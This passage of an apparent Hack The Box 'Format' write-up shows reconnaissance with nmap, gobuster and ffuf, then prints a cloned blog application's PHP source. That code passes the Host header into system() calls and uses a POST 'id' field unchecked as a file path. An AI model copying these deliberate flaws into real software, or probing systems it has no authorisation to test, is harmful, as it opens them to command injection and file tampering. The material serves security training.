# Format

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.186.151
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 19:02 UTC
Nmap scan report for 10.129.186.151
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/13%OT=22%CT=1%CU=40305%PV=Y%DS=2%DC=T%G=Y%TM=645FDEE
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   102.40 ms 10.10.16.1
2   52.99 ms  10.129.186.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.06 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.186.151
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 19:03 UTC
Nmap scan report for 10.129.186.151
Host is up (0.10s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/13%OT=22%CT=1%CU=40259%PV=Y%DS=2%DC=T%G=Y%TM=645FDF2
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=101%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O
OS:3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   96.50 ms 10.10.16.1
2   48.85 ms 10.129.186.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.83 seconds
```

```c
$ sudo nmap -sV -sU 10.129.186.151
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 19:04 UTC
Nmap scan report for app.microblog.htb (10.129.186.151)
Host is up (0.067s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1210.87 seconds
```

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.186.151  microblog.htb
10.129.186.151  app.microblog.htb
```

### Enumeration of Port 80/TCP

> http://app.microblog.htb/

> http://app.microblog.htb/login/

```c
$ whatweb http://app.microblog.htb/
http://app.microblog.htb/ [200 OK] Cookies[username], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.129.186.151], JQuery, Script, Title[Microblog], nginx[1.18.0]
```

### Directory Busting with Gobuster

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://app.microblog.htb/
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://app.microblog.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/13 19:04:35 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 169] [--> http://app.microblog.htb/login/]
/register             (Status: 301) [Size: 169] [--> http://app.microblog.htb/register/]
/logout               (Status: 301) [Size: 169] [--> http://app.microblog.htb/logout/]
/dashboard            (Status: 301) [Size: 169] [--> http://app.microblog.htb/dashboard/]
Progress: 207618 / 207644 (99.99%)
===============================================================
2023/05/13 19:31:45 Finished
===============================================================
```

### Subdomain Enumeration with ffuf

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.microblog.htb" -u http://microblog.htb --fs 153 --mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://microblog.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.microblog.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 153
________________________________________________

[Status: 200, Size: 3976, Words: 899, Lines: 84, Duration: 64ms]
    * FUZZ: app

[Status: 200, Size: 3732, Words: 630, Lines: 43, Duration: 67ms]
    * FUZZ: sunny

:: Progress: [114441/114441] :: Job [1/1] :: 664 req/sec :: Duration: [0:03:03] :: Errors: 0 ::
```

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.186.151  microblog.htb
10.129.186.151  app.microblog.htb
10.129.186.151  sunny.microblog.htb
```

### Enumeration of Port 3000/TCP

> http://microblog.htb:3000/

| Username |
| --- |
| cooper |

> http://microblog.htb:3000/cooper/microblog

```c
$ git clone http://microblog.htb:3000/cooper/microblog.git
Cloning into 'microblog'...
remote: Enumerating objects: 61, done.
remote: Counting objects: 100% (61/61), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 61 (delta 7), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (61/61), 701.38 KiB | 1.11 MiB/s, done.
Resolving deltas: 100% (7/7), done.
```

```c
$ find .
.
./.git
./.git/info
./.git/info/exclude
./.git/hooks
./.git/hooks/prepare-commit-msg.sample
./.git/hooks/push-to-checkout.sample
./.git/hooks/pre-rebase.sample
./.git/hooks/pre-push.sample
./.git/hooks/pre-receive.sample
./.git/hooks/applypatch-msg.sample
./.git/hooks/fsmonitor-watchman.sample
./.git/hooks/update.sample
./.git/hooks/pre-applypatch.sample
./.git/hooks/pre-merge-commit.sample
./.git/hooks/post-update.sample
./.git/hooks/pre-commit.sample
./.git/hooks/commit-msg.sample
./.git/branches
./.git/description
./.git/refs
./.git/refs/heads
./.git/refs/heads/main
./.git/refs/tags
./.git/refs/remotes
./.git/refs/remotes/origin
./.git/refs/remotes/origin/HEAD
./.git/objects
./.git/objects/pack
./.git/objects/pack/pack-817b6574d8b6e61351fed1f230f091871bd453cc.pack
./.git/objects/pack/pack-817b6574d8b6e61351fed1f230f091871bd453cc.idx
./.git/objects/info
./.git/packed-refs
./.git/logs
./.git/logs/refs
./.git/logs/refs/remotes
./.git/logs/refs/remotes/origin
./.git/logs/refs/remotes/origin/HEAD
./.git/logs/refs/heads
./.git/logs/refs/heads/main
./.git/logs/HEAD
./.git/HEAD
./.git/config
./.git/index
./README.md
./html
./html/index.html
./microblog-template
./microblog-template/content
./microblog-template/content/order.txt
./microblog-template/edit
./microblog-template/edit/index.php
./microblog-template/images
./microblog-template/images/brain.ico
./microblog-template/index.php
./microblog
./microblog/app
./microblog/app/brain.ico
./microblog/app/brain.png
./microblog/app/dashboard
./microblog/app/dashboard/index.php
./microblog/app/index.php
./microblog/app/login
./microblog/app/login/index.php
./microblog/app/logout
./microblog/app/logout/index.php
./microblog/app/register
./microblog/app/register/index.php
./microblog/sunny
./microblog/sunny/content
./microblog/sunny/content/2766wxkoacy
./microblog/sunny/content/jtdpx1iea5
./microblog/sunny/content/order.txt
./microblog/sunny/content/rle1v1hnms
./microblog/sunny/content/syubx3wiu3e
./microblog/sunny/edit
./microblog/sunny/edit/index.php
./microblog/sunny/images
./microblog/sunny/images/brain.ico
./microblog/sunny/index.php
./microbucket
./microbucket/css
./microbucket/css/health.txt
./microbucket/css/styles.css
./microbucket/js
./microbucket/js/fontawesome.js
./microbucket/js/health.txt
./microbucket/js/jquery.js
./microbucket/js/typed.js
./pro-files
./pro-files/bulletproof.php
```

```c
$ git log
commit 1d04f4750bdbf245c589f1b3266a7c29c6508218 (HEAD -> main, origin/main, origin/HEAD)
Author: cooper <cooper@microblog.htb>
Date:   Tue Dec 13 22:28:04 2022 +1100

    rename microbucket, remove octopus pic

commit f780774fc59eff9f63db5722a67c133b445d2750
Author: cooper <cooper@microblog.htb>
Date:   Sat Nov 5 16:58:45 2022 +1100

    v1.0.2 - css edit

commit ae6a1a07f81d046e79fec33034f5ba5deb734834
Author: cooper <cooper@microblog.htb>
Date:   Sat Nov 5 00:32:20 2022 +1100

    v1.0.1 - fix css, add example

commit 9c21096a7a18dd2e1f458307357dbaeb10e34e02
Author: cooper <cooper@microblog.htb>
Date:   Fri Nov 4 23:20:33 2022 +1100

    v1.0.0
```

```c
$ git diff f780774fc59eff9f63db5722a67c133b445d2750
diff --git a/microblog-template/images/octopus.jpg b/microblog-template/images/octopus.jpg
deleted file mode 100644
index d845db7..0000000
Binary files a/microblog-template/images/octopus.jpg and /dev/null differ
diff --git a/microblog/sunny/images/octopus.jpg b/microblog/sunny/images/octopus.jpg
deleted file mode 100644
index d845db7..0000000
Binary files a/microblog/sunny/images/octopus.jpg and /dev/null differ
diff --git a/bucket/css/health.txt b/microbucket/css/health.txt
similarity index 100%
rename from bucket/css/health.txt
rename to microbucket/css/health.txt
diff --git a/bucket/css/styles.css b/microbucket/css/styles.css
similarity index 100%
rename from bucket/css/styles.css
rename to microbucket/css/styles.css
diff --git a/bucket/js/fontawesome.js b/microbucket/js/fontawesome.js
similarity index 100%
rename from bucket/js/fontawesome.js
rename to microbucket/js/fontawesome.js
diff --git a/bucket/js/health.txt b/microbucket/js/health.txt
similarity index 100%
rename from bucket/js/health.txt
rename to microbucket/js/health.txt
diff --git a/bucket/js/jquery.js b/microbucket/js/jquery.js
similarity index 100%
rename from bucket/js/jquery.js
rename to microbucket/js/jquery.js
diff --git a/bucket/js/typed.js b/microbucket/js/typed.js
similarity index 100%
rename from bucket/js/typed.js
rename to microbucket/js/typed.js
```

```c
$ git diff ae6a1a07f81d046e79fec33034f5ba5deb734834
diff --git a/microblog-template/images/octopus.jpg b/microblog-template/images/octopus.jpg
deleted file mode 100644
index d845db7..0000000
Binary files a/microblog-template/images/octopus.jpg and /dev/null differ
diff --git a/microblog/sunny/images/octopus.jpg b/microblog/sunny/images/octopus.jpg
deleted file mode 100644
index d845db7..0000000
Binary files a/microblog/sunny/images/octopus.jpg and /dev/null differ
diff --git a/bucket/css/health.txt b/microbucket/css/health.txt
similarity index 100%
rename from bucket/css/health.txt
rename to microbucket/css/health.txt
diff --git a/bucket/css/styles.css b/microbucket/css/styles.css
similarity index 99%
rename from bucket/css/styles.css
rename to microbucket/css/styles.css
index 7f8c998..9e41ed7 100644
--- a/bucket/css/styles.css
+++ b/microbucket/css/styles.css
@@ -638,7 +638,7 @@ body.dashboard {
        padding: 15px 0px;
        font-weight: bold;
        display: inline-block;
-       width: 39%;
+       width: 38.9%;
 }
   
 #file-chosen{
diff --git a/bucket/js/fontawesome.js b/microbucket/js/fontawesome.js
similarity index 100%
rename from bucket/js/fontawesome.js
rename to microbucket/js/fontawesome.js
diff --git a/bucket/js/health.txt b/microbucket/js/health.txt
similarity index 100%
rename from bucket/js/health.txt
rename to microbucket/js/health.txt
diff --git a/bucket/js/jquery.js b/microbucket/js/jquery.js
similarity index 100%
rename from bucket/js/jquery.js
rename to microbucket/js/jquery.js
diff --git a/bucket/js/typed.js b/microbucket/js/typed.js
similarity index 100%
rename from bucket/js/typed.js
rename to microbucket/js/typed.js
```

```c
$ git diff 9c21096a7a18dd2e1f458307357dbaeb10e34e02
diff --git a/microblog-template/images/octopus.jpg b/microblog-template/images/octopus.jpg
deleted file mode 100644
index d845db7..0000000
Binary files a/microblog-template/images/octopus.jpg and /dev/null differ
diff --git a/microblog/sunny/content/2766wxkoacy b/microblog/sunny/content/2766wxkoacy
new file mode 100644
index 0000000..996db1a
--- /dev/null
+++ b/microblog/sunny/content/2766wxkoacy
@@ -0,0 +1 @@
+<div class = "blog-h1 blue-fill"><b>It's Always Sunny in Philadelphia</b></div>
\ No newline at end of file
diff --git a/microblog/sunny/content/jtdpx1iea5 b/microblog/sunny/content/jtdpx1iea5
new file mode 100644
index 0000000..6abe10d
--- /dev/null
+++ b/microblog/sunny/content/jtdpx1iea5
@@ -0,0 +1,5 @@
+<div class = "blog-text">It's Always Sunny in Philadelphia is an American sitcom that premiered on FX on August 4, 2005. It moved to FXX beginning with the ninth season in 2013. The show was created by Rob McElhenney, who developed it with Glenn Howerton. It is executive produced and primarily written by McElhenney, Howerton, and Charlie Day, starring alongside Kaitlin Olson and Danny DeVito. The series follows the exploits of "The Gang", a group of narcissistic, sociopathic friends who run the Irish bar Paddy's Pub in South Philadelphia, Pennsylvania, but spend most of their free time drinking, scheming, arguing amongst themselves, and plotting elaborate cons against others (and at times each other), often for petty reasons such as personal benefit, financial gain, revenge, or simply out of boredom, while belittling, berating, and manipulating each other in the process at seemingly any opportunity.<br />^M
+<br />^M
+The 14th season concluded in November 2019, and was renewed for a 15th season in May 2020, which premiered on December 1, 2021. This resulted in it having more seasons than any other American live-action comedy series, replacing The Adventures of Ozzie and Harriet, which ran for 14 seasons between 1952 and 1966. In December 2020, the series was renewed for a total of four additional seasons, bringing it to 18 seasons.<br />^M
+<br />^M
+The show has received critical acclaim, with many lauding the cast performances and dark humor. It has amassed a large cult following.</div>
\ No newline at end of file
diff --git a/microblog/sunny/content/order.txt b/microblog/sunny/content/order.txt
new file mode 100755
index 0000000..e499ea9
--- /dev/null
+++ b/microblog/sunny/content/order.txt
@@ -0,0 +1,4 @@
+2766wxkoacy
+jtdpx1iea5
+rle1v1hnms
+syubx3wiu3e
diff --git a/microblog/sunny/content/rle1v1hnms b/microblog/sunny/content/rle1v1hnms
new file mode 100644
index 0000000..4536af9
--- /dev/null
+++ b/microblog/sunny/content/rle1v1hnms
@@ -0,0 +1 @@
+<div class = "blog-h1 blue-fill"><b>Danny DeVito??</b></div>
\ No newline at end of file
diff --git a/microblog/sunny/content/syubx3wiu3e b/microblog/sunny/content/syubx3wiu3e
new file mode 100644
index 0000000..9ff2a89
--- /dev/null
+++ b/microblog/sunny/content/syubx3wiu3e
@@ -0,0 +1 @@
+<div class = "blog-text">Before production of the second season began, series creator Rob McElhenney found out that Danny DeVito was a fan of the show and a friend of FX president, John Landgraf. McElhenney asked Landgraf to set up a meeting. McElhenney met DeVito at his home and pitched DeVito's character, Frank Reynolds.</div>
\ No newline at end of file
diff --git a/microblog/sunny/edit/index.php b/microblog/sunny/edit/index.php
new file mode 100644
index 0000000..f2dd423
--- /dev/null
+++ b/microblog/sunny/edit/index.php
@@ -0,0 +1,316 @@
+<?php
+$username = session_name("username");
+session_set_cookie_params(0, '/', '.microblog.htb');
+session_start();
+if(file_exists("bulletproof.php")) {
+    require_once "bulletproof.php";
+}
+
+if(is_null($_SESSION['username'])) {
+    header("Location: /");
+    exit;
+}
+
+function checkUserOwnsBlog() {
+    $redis = new Redis();
+    $redis->connect('/var/run/redis/redis.sock');
+    $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
+    $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
+    if(!in_array($subdomain, $userSites)) {
+        header("Location: /");
+        exit;
+    }
+}
+
+function provisionProUser() {
+    if(isPro() === "true") {
+        $blogName = trim(urldecode(getBlogName()));
+        system("chmod +w /var/www/microblog/" . $blogName);
+        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
+        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
+        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
+        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
+    }
+    return;
+}
+
+//always check user owns blog before proceeding with any actions
+checkUserOwnsBlog();
+
+//provision pro environment for new pro users
+provisionProUser();
+
+//delete section
+if(isset($_POST['action']) && isset($_POST['id'])) {
+    chdir(getcwd() . "/../content");
+    $contents = file_get_contents("order.txt");
+    $contents = str_replace($_POST['id'] . "\n", '', $contents);
+    file_put_contents("order.txt", $contents);
+
+    //delete image file if content is image
+    $data = file_get_contents($_POST['id']);
+    $img_check = substr($data, 0, 26);
+    if($img_check === "<div class = \"blog-image\">") {
+        $startsAt = strpos($data, "<img src = \"/uploads/") + strlen("<img src = \"/uploads/");
+        $endsAt = strpos($data, "\" /></div>", $startsAt);
+        $fileToDelete = substr($data, $startsAt, $endsAt - $startsAt);
+        chdir(getcwd() . "/../uploads");
+        $file_pointer = $fileToDelete;
+        unlink($file_pointer);
+        chdir(getcwd() . "/../content");
+    }
+    $file_pointer = $_POST['id'];
+    unlink($file_pointer);
+    return "Section deleted successfully";
+}
+
+//add header
+if (isset($_POST['header']) && isset($_POST['id'])) {
+    chdir(getcwd() . "/../content");
+    $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
+    $post_file = fopen("{$_POST['id']}", "w");
+    fwrite($post_file, $html);
+    fclose($post_file);
+    $order_file = fopen("order.txt", "a");
+    fwrite($order_file, $_POST['id'] . "\n");  
+    fclose($order_file);
+    header("Location: /edit?message=Section added!&status=success");
+}
+
+//add text
+if (isset($_POST['txt']) && isset($_POST['id'])) {
+    chdir(getcwd() . "/../content");
+    $txt_nl = nl2br($_POST['txt']);
+    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
+    $post_file = fopen("{$_POST['id']}", "w");
+    fwrite($post_file, $html);
+    fclose($post_file);
+    $order_file = fopen("order.txt", "a");
+    fwrite($order_file, $_POST['id'] . "\n");  
+    fclose($order_file);
+    header("Location: /edit?message=Section added!&status=success");
+}
+
+//add image
+if (isset($_FILES['image']) && isset($_POST['id'])) {
+    if(isPro() === "false") {
+        print_r("Pro subscription required to upload images");
+        header("Location: /edit?message=Pro subscription required&status=fail");
+        exit();
+    }
+    $image = new Bulletproof\Image($_FILES);
+    $image->setLocation(getcwd() . "/../uploads");
+    $image->setSize(100, 3000000);
+    $image->setMime(array('png'));
+
+    if($image["image"]) {
+        $upload = $image->upload();
+
+        if($upload) {
+            $upload_path = "/uploads/" . $upload->getName() . ".png";
+            $html = "<div class = \"blog-image\"><img src = \"{$upload_path}\" /></div>";
+            chdir(getcwd() . "/../content");
+            $post_file = fopen("{$_POST['id']}", "w");
+            fwrite($post_file, $html);
+            fclose($post_file);
+            $order_file = fopen("order.txt", "a");
+            fwrite($order_file, $_POST['id'] . "\n");  
+            fclose($order_file);
+            header("Location: /edit?message=Image uploaded successfully&status=success");
+        }
+        else {
+            header("Location: /edit?message=Image upload failed&status=fail");
+        }
+    }
+}
+
+function isPro() {
+    if(isset($_SESSION['username'])) {
+        $redis = new Redis();
+        $redis->connect('/var/run/redis/redis.sock');
+        $pro = $redis->HGET($_SESSION['username'], "pro");
+        return strval($pro);
+    }
+    return "false";
+}
+
+function getBlogName() {
+    return '"' . array_shift((explode('.', $_SERVER['HTTP_HOST']))) . '"';
+}
+
+function getFirstName() {
+    if(isset($_SESSION['username'])) {
+        $redis = new Redis();
+        $redis->connect('/var/run/redis/redis.sock');
+        $firstName = $redis->HGET($_SESSION['username'], "first-name");
+        return "\"" . ucfirst(strval($firstName)) . "\"";
+    }
+}
+
+function fetchPage() {
+    chdir(getcwd() . "/../content");
+    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
+    $html_content = "";
+    foreach($order as $line) {
+        $temp = $html_content;
+        $html_content = $temp . "<div class = \"{$line} blog-indiv-content\">" . file_get_contents($line) . "</div>";
+    }
+    return $html_content;
+}
+
+?>
+<!DOCTYPE html>
+<head>
+<link rel="icon" type="image/x-icon" href="/images/brain.ico">
+<link rel="stylesheet" href="http://microblog.htb/static/css/styles.css">
+<script src="http://microblog.htb/static/js/jquery.js"></script>
+<script src="http://microblog.htb/static/js/fontawesome.js"></script>
+<title></title>
+<script>
+    $(window).on('load', function(){
+        const queryString = window.location.search;
+        if(queryString) {
+            const urlParams = new URLSearchParams(queryString);
+            if(urlParams.get('message') && urlParams.get('status')) {
+                const status = urlParams.get('status')
+                const message = urlParams.get('message')
+                $(".floating-message").css("display", "block");
+                $(".floating-message").children(".message-content").text(message);
+                if(status === "fail") {
+                    $(".floating-message").css("background-color", "#AF0606");
+                }
+                else {
+                    $(".floating-message").css("background-color", "#4BB543");
+                }
+            }
+        }
+        const pro = <?php echo isPro(); ?>;
+        if(!pro) {
+            $(".pro").css("display", "none");
+            $("#img-dot").css("display", "none");
+        }
+        const html = <?php echo json_encode(fetchPage()); ?>.replace(/(\r\n|\n|\r)/gm, "");
+        $(".push-for-h1").after(html);
+        $(".user-first-name").text(<?php echo getFirstName(); ?>);
+        $(".blog-name").text(<?php echo getBlogName(); ?>);
+        const class_after_push = $(".push-for-h1").next().children().attr('class');
+        if(class_after_push) {
+            if(class_after_push.includes("blog-h1")) {
+                $(".push-for-h1").css("display", "none");
+            }
+        }
+        const placeholders = ["Today, I learned to...", "You won't believe what happened! I went...", "My name is...", "On today's adventure in the park, I...", "Well, it finally happened..."];
+        $(".txt-form-input").attr("placeholder", placeholders.sort(() => 0.5 - Math.random())[0]);
+        $(".form-id").attr("value", Math.random().toString(36).slice(2));
+
+        //image upload
+        const actualBtn = document.getElementById('actual-btn');
+        const fileChosen = document.getElementById('file-chosen');
+        actualBtn.addEventListener('change', function(){
+            fileChosen.textContent = this.files[0].name
+        })
+
+        //add delete buttons
+        $('.blog-indiv-content').each(
+            function() {
+                $(this).prepend("<i class=\"fa fa-trash delete-button\" onclick=delete_section(this)></i>");
+            }
+        )
+
+        const blogName = String(window.location).split('.')[0].split('//')[1]
+        document.title = blogName + " - edit - Microblog"
+        $(".blog-name").attr("href", "http://"+blogName+".microblog.htb")
+    });
+</script>
+<script>
+    function showForm(name) {
+        //reset selected options
+        $(".dot").removeClass("dotSelected");
+        $(".component-form").css("display", "none");
+        $(".dot").css("background", "#CA776D");
+
+        $(`#${name}-dot`).addClass("dotSelected");
+        $(".dot").hover(
+            function() {
+                if(!$(this).hasClass("dotSelected")) {
+                    $(this).css("background", "#e4aaa3")
+                }
+            },
+            function() {
+                if(!$(this).hasClass("dotSelected")) {
+                    $(this).css("background", "#CA776D")
+                }
+            }
+        )
+        $(`#${name}-form`).css("display", "block");
+        $(`#${name}-dot`).css("background", "#e4aaa3");
+    }
+</script>
+<script>
+    function delete_section(section) {
+        const id = $(section).parent().attr('class').split(" ")[0]
+        $.ajax({
+            type: "POST",
+            url: "/edit/index.php",
+            data: {"action":"delete","id":id},
+            success: function() {
+                window.location.replace("/edit?message=Section deleted&status=success");
+            }
+        })
+    }
+</script>
+</head>
+<body>
+    <div class="floating-message">
+        <span class="message-content" style = "margin-right: 10px"></span>
+        <span class="closebtn" style = "font-weight: bold;" onclick="this.parentElement.style.display='none';">&times;</span>
+    </div>
+    <div class = "blue-fill" style = "border-bottom: 2px solid; padding-bottom: 25px;">
+        <div class="navbar" style = "overflow: inherit;">
+            <a href="http://app.microblog.htb" class="float-left title">Microblog</a>
+            <div class = "float-right select-buttons">
+                <span class = "pro"><i class="fa fa-star gold"></i>&nbsp;&nbsp;<span class = "gold">Pro</span></span>
+                <div class = "menu-button hello-text">Hello, <span class = "user-first-name"></span></div>
+                <a href="http://app.microblog.htb/dashboard" class = "menu-button">Dashboard</a>
+                <a href="http://app.microblog.htb/logout" class = "menu-button">Logout</a>
+            </div>
+        </div>
+        <div class = "header-content-item">
+            <span class = "big-text heading">Edit Blog</span>
+            <a class = "blog-name" style = "font-size: 25px; text-align: center; top: -20px; position: relative; display: block; margin-left: auto; margin-right: auto; width: min-content;"></a>
+        </div>
+    </div>
+    <div class = "push-for-h1" style = "min-height: 25px;"></div>
+    <div class = "component-selector">
+        <div class = "links">
+            <a class = "dot" id = "h1-dot" onclick="showForm('h1')">h1</a>
+            <a class = "dot" id = "txt-dot" onclick="showForm('txt')">txt</a>
+            <a class = "dot" id = "img-dot" onclick="showForm('img')">img</a>
+        </div>
+    </div>
+    <form action="<?=$_SERVER['PHP_SELF']?>" method="POST" class = "component-form" id = "h1-form">
+        <input class = "form-id" name = "id" type="hidden"/>
+        <input name = "header" type = "text" placeholder = "Header" required>
+        <input type = "submit" value="Post">
+    </form>
+    <form action="<?=$_SERVER['PHP_SELF']?>" method="POST" class = "component-form" id = "txt-form">
+        <input class = "form-id" name = "id" type="hidden"/>
+        <textarea name = "txt" form="txt-form" class = "txt-form-input" required></textarea>
+        <input type = "submit" value="Post">
+    </form>
+    <form action="<?=$_SERVER['PHP_SELF']?>" method="POST" class = "component-form" id = "img-form" enctype="multipart/form-data">
+        <div class = "image-upload-outer">
+            <input class = "form-id" name = "id" type="hidden"/>
+            <input type="file" id="actual-btn" name="image" accept="image/png" hidden required/>
+            <label class = "select-image-label pink-fill" for="actual-btn">Select Image</label>
+            <span id="file-chosen">No image selected</span>
+        </div>
+        <p></p>
+        <input type = "submit" value="Upload">
+    </form>
+    <footer>
+        © 2022 Microblog<br/>
+        <a href="https://www.vecteezy.com/free-vector/brain">Brain Vectors by Vecteezy</a>
+    </footer>
+</body>
+</html>
diff --git a/microblog/sunny/images/brain.ico b/microblog/sunny/images/brain.ico
new file mode 100644
index 0000000..739b2f5
Binary files /dev/null and b/microblog/sunny/images/brain.ico differ
diff --git a/microblog/sunny/index.php b/microblog/sunny/index.php
new file mode 100644
index 0000000..0b3739f
--- /dev/null
+++ b/microblog/sunny/index.php
@@ -0,0 +1,85 @@
+<?php
+$username = session_name("username");
+session_set_cookie_params(0, '/', '.microblog.htb');
+session_start();
+
+function checkAuth() {
+    return(isset($_SESSION['username']));
+}
+
+function checkOwner() {
+    if(checkAuth()) {
+        $redis = new Redis();
+        $redis->connect('/var/run/redis/redis.sock');
+        $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
+        $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
+        if(in_array($subdomain, $userSites)) {
+            return $_SESSION['username'];
+        }
+    }
+    return "";
+}
+
+function getFirstName() {
+    if(isset($_SESSION['username'])) {
+        $redis = new Redis();
+        $redis->connect('/var/run/redis/redis.sock');
+        $firstName = $redis->HGET($_SESSION['username'], "first-name");
